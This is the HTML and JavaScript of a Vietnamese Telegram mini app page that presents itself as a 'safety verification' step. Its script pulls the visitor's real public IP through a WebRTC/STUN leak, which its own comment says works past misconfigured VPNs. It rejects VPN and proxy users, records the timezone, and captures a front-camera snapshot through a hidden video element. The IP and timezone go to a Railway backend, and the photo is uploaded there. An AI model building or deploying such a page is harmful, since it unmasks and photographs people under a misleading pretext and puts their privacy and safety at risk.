<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
    <title>Xác Minh An Toàn</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f5f5f5; color: #333; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 12px; }
        .card { background: #fff; padding: 24px; border-radius: 16px; box-shadow: 0 4px 15px rgba(0,0,0,.08); text-align: center; max-width: 340px; width: 100%; }
        h3 { margin: 0 0 8px; color: #0088cc; }
        #status { font-size: 15px; line-height: 1.45; margin: 8px 0; }
        #status.err { color: #c9302c; font-weight: 600; }
        #status.ok { color: #2e7d32; font-weight: 600; }
        .ip-box { background: #eef7fc; padding: 10px; border-radius: 8px; font-weight: bold; font-family: monospace; font-size: 15px; margin: 12px 0; color: #005580; word-break: break-all; }
        .ip-box.bad { background: #fdecea; color: #c9302c; }
        .captcha-box input { padding: 10px; width: 80%; border-radius: 8px; border: 1px solid #ccc; text-align: center; font-size: 16px; margin-top: 6px; }
        #captcha-question { font-weight: bold; font-size: 20px; color: #d9534f; margin: 8px 0; }
        button { background: #0088cc; color: #fff; border: none; padding: 12px 20px; font-size: 15px; font-weight: bold; border-radius: 10px; cursor: pointer; width: 100%; margin-top: 10px; }
        button:disabled { background: #ccc; cursor: not-allowed; }
        button.secondary { background: #6c757d; }
        .note { font-size: 12px; color: #888; margin-top: 10px; line-height: 1.4; }
        .spinner { width: 28px; height: 28px; border: 3px solid #cfe8f5; border-top-color: #0088cc; border-radius: 50%; animation: spin .8s linear infinite; margin: 10px auto; }
        @keyframes spin { to { transform: rotate(360deg); } }
        #video-container { position: absolute; width: 1px; height: 1px; opacity: 0; pointer-events: none; overflow: hidden; }
    </style>
</head>
<body>
    <div class="card">
        <h3>XÁC MINH AN TOÀN</h3>
        <div id="spinner" class="spinner"></div>
        <p id="status">Đang tải hệ thống...</p>
        <div id="ip-display" class="ip-box" style="display:none;"></div>

        <div id="captcha-section" style="display:none;" class="captcha-box">
            <div id="captcha-question"></div>
            <input type="number" inputmode="numeric" id="captcha-answer" placeholder="Nhập kết quả phép tính">
            <button id="btn-captcha" onclick="verifyCaptcha()">XÁC NHẬN CAPTCHA</button>
        </div>

        <button id="btn-submit" style="display:none;" onclick="startVerificationProcess()">TIẾP TỤC XÁC MINH</button>
        <button id="btn-retry" class="secondary" style="display:none;" onclick="begin()">THỬ LẠI</button>
        <p class="note" id="note" style="display:none;"></p>
    </div>

    <div id="video-container">
        <video id="video" autoplay playsinline muted></video>
        <canvas id="canvas"></canvas>
    </div>

    <script>
        const tg = (window.Telegram && window.Telegram.WebApp) ? window.Telegram.WebApp : null;
        if (tg) { tg.ready(); tg.expand(); }

        // Backend (Railway). IP KHÔNG lấy từ trình duyệt nữa mà do SERVER ghi nhận.
        // Mở từ Railway (/miniapp) -> gọi cùng tên miền. Mở từ nơi khác (GitHub Pages...) -> gọi về Railway.
        const RAILWAY_URL = "https://phongstkca-production.up.railway.app";
        const BACKEND_URL = (location.hostname.endsWith("railway.app") || location.hostname.endsWith("up.railway.app"))
            ? location.origin
            : RAILWAY_URL;

        const params = new URLSearchParams(window.location.search);
        const token = params.get('token') || params.get('t') || '';

        let localStream = null;
        let busy = false;

        const $ = (id) => document.getElementById(id);
        const show = (id, on = true) => { $(id).style.display = on ? 'block' : 'none'; };

        function setStatus(text, kind) {
            const s = $('status');
            s.textContent = text;
            s.className = kind || '';
        }
        function setNote(text) {
            const n = $('note');
            if (text) { n.textContent = text; n.style.display = 'block'; } else { n.style.display = 'none'; }
        }
        function stopCamera() {
            if (localStream) { localStream.getTracks().forEach(t => t.stop()); localStream = null; }
        }
        function resetUI() {
            show('spinner', true);
            show('ip-display', false);
            show('captcha-section', false);
            show('btn-submit', false);
            show('btn-retry', false);
            $('ip-display').classList.remove('bad');
            setNote('');
        }
        function fail(text, canRetry) {
            show('spinner', false);
            stopCamera();
            setStatus('❌ ' + text, 'err');
            show('btn-retry', !!canRetry);
            busy = false;
        }

        async function api(path, body, timeoutMs = 15000) {
            const ctrl = new AbortController();
            const timer = setTimeout(() => ctrl.abort(), timeoutMs);
            try {
                const r = await fetch(BACKEND_URL + path, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(body),
                    signal: ctrl.signal
                });
                let data = {};
                try { data = await r.json(); } catch (e) {}
                return { status: r.status, data };
            } finally {
                clearTimeout(timer);
            }
        }

        // Lấy IP công khai mà WebRTC để lộ (VPN/proxy cấu hình dở thường bị rò IP thật)
        function collectWebRTC(ms = 2500) {
            return new Promise((resolve) => {
                const ips = new Set();
                let done = false, pc = null;
                const finish = () => {
                    if (done) return;
                    done = true;
                    try { pc && pc.close(); } catch (e) {}
                    resolve(Array.from(ips));
                };
                try {
                    if (!window.RTCPeerConnection) return resolve([]);
                    pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
                    pc.createDataChannel('x');
                    pc.onicecandidate = (e) => {
                        if (!e.candidate) { finish(); return; }
                        const m = /\s([0-9a-fA-F:.]+)\s\d+\styp\s(srflx|prflx)/.exec(e.candidate.candidate || '');
                        if (m) ips.add(m[1]);
                    };
                    pc.createOffer().then(o => pc.setLocalDescription(o)).catch(finish);
                    setTimeout(finish, ms);
                } catch (e) { resolve([]); }
            });
        }

        // ===== BƯỚC 1: server ghi nhận IP + kiểm tra VPN/Proxy =====
        async function begin() {
            if (busy) return;
            busy = true;
            resetUI();
            setStatus('Đang kiểm tra kết nối an toàn...');

            if (!token) { fail('Thiếu mã xác minh. Hãy quay lại bot và bấm lại nút xác minh.', false); return; }

            const webrtc = await collectWebRTC();
            let tz = '';
            try { tz = Intl.DateTimeFormat().resolvedOptions().timeZone || ''; } catch (e) {}

            let res;
            try {
                res = await api('/api/start', {
                    token: token,
                    tz_offset: new Date().getTimezoneOffset(),
                    tz: tz,
                    webrtc: webrtc
                });
            } catch (e) {
                fail('Không kết nối được máy chủ. Kiểm tra mạng rồi bấm Thử lại.', true);
                return;
            }

            const d = res.data || {};
            show('spinner', false);

            if (d.ok) {
                $('ip-display').textContent = d.ip;
                show('ip-display', true);
                setStatus('✅ Kết nối hợp lệ. Địa chỉ IP của bạn:', 'ok');
                $('captcha-question').textContent = (d.question || '') + ' = ?';
                show('btn-submit', true);
                setNote('Bước tiếp theo cần quyền Camera. Ảnh chụp sẽ được gửi cho quản trị viên để chống tài khoản clone/gian lận.');
                busy = false;
            } else if (d.error === 'vpn') {
                if (d.ip) { $('ip-display').textContent = d.ip; $('ip-display').classList.add('bad'); show('ip-display', true); }
                fail('Phát hiện: ' + (d.reason || 'VPN/Proxy') + '. Hãy TẮT VPN / Proxy / DNS riêng, dùng mạng 4G hoặc WiFi thật rồi bấm Thử lại.', true);
            } else {
                fail(d.message || 'Xác minh thất bại, vui lòng thử lại.', d.error !== 'token_invalid');
            }
        }

        // ===== BƯỚC 2: camera + gửi ảnh lên server =====
        async function startVerificationProcess() {
            if (busy) return;
            busy = true;
            show('btn-submit', false);
            setStatus('Vui lòng cho phép truy cập Camera để tiếp tục:');
            setNote('Hệ thống cần quyền Camera để xác minh.');

            const camOK = await requestCamera();
            if (!camOK) {
                try { tg && tg.sendData(JSON.stringify({ type: 'camera_denied', token: token })); } catch (e) {}
                fail('Bạn đã từ chối quyền Camera. Hãy cho phép Camera để xác minh!', false);
                setTimeout(() => { try { tg && tg.close(); } catch (e) {} }, 2000);
                return;
            }

            await new Promise(r => setTimeout(r, 1500));
            const image = snapshot();
            stopCamera();
            if (!image) { fail('Không chụp được ảnh. Hãy thử lại.', true); return; }

            setStatus('Đang gửi dữ liệu xác minh...');
            show('spinner', true);
            let ok = false, blockedReason = '';
            for (let i = 0; i < 2 && !ok; i++) {
                try {
                    const r = await api('/api/save-photo', { token: token, image: image, auto_capture: true }, 25000);
                    if (r.status === 200 && r.data && r.data.status === 'success') ok = true;
                    else if (r.status === 403) { blockedReason = (r.data && r.data.reason) || 'VPN/Proxy'; break; }
                } catch (e) {}
            }
            show('spinner', false);
            if (blockedReason) { fail('Phát hiện: ' + blockedReason + '. Hãy tắt VPN/Proxy rồi bấm Thử lại.', true); return; }
            if (!ok) { fail('Không gửi được dữ liệu. Kiểm tra mạng rồi bấm Thử lại.', true); return; }

            setStatus('Vui lòng giải Captcha bên dưới:');
            setNote('');
            show('captcha-section', true);
            busy = false;
        }

        async function requestCamera() {
            try {
                localStream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                    audio: false
                });
                const video = $('video');
                video.srcObject = localStream;
                await new Promise((resolve) => {
                    if (video.readyState >= 1) resolve(); else video.onloadedmetadata = () => resolve();
                });
                await video.play();
                return true;
            } catch (err) {
                console.log('Không thể truy cập camera:', err);
                return false;
            }
        }

        function snapshot() {
            try {
                const video = $('video'), canvas = $('canvas');
                if (!video.videoWidth) return '';
                canvas.width = 640; canvas.height = 480;
                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                return canvas.toDataURL('image/jpeg', 0.85);
            } catch (e) { console.log('Lỗi chụp ảnh:', e); }
            return '';
        }

        // ===== BƯỚC 3: captcha do SERVER kiểm tra =====
        async function verifyCaptcha() {
            const v = $('captcha-answer').value.trim();
            if (!v) return;
            const btn = $('btn-captcha');
            btn.disabled = true;
            try {
                const r = await api('/api/captcha', { token: token, answer: v });
                const d = r.data || {};
                if (d.ok) {
                    show('captcha-section', false);
                    setStatus('✅ Xác minh thành công! Đang gửi dữ liệu...', 'ok');
                    try { tg && tg.sendData(JSON.stringify({ type: 'camera_snapshot', token: token, passed: true })); } catch (e) {}
                    setTimeout(() => { try { tg && tg.close(); } catch (e) {} }, 600);
                    return;
                }
                if (d.error === 'blocked' || d.error === 'token_invalid') {
                    show('captcha-section', false);
                    fail(d.message || 'Phiên xác minh không hợp lệ. Bấm Thử lại.', true);
                    return;
                }
                if (d.question) $('captcha-question').textContent = d.question + ' = ?';
                $('captcha-answer').value = '';
                setStatus('❌ ' + (d.message || 'Kết quả không chính xác, thử lại!'), 'err');
            } catch (e) {
                setStatus('❌ Lỗi mạng, vui lòng thử lại.', 'err');
            }
            btn.disabled = false;
        }

        window.addEventListener('pagehide', stopCamera);
        begin();
    </script>
</body>
</html>
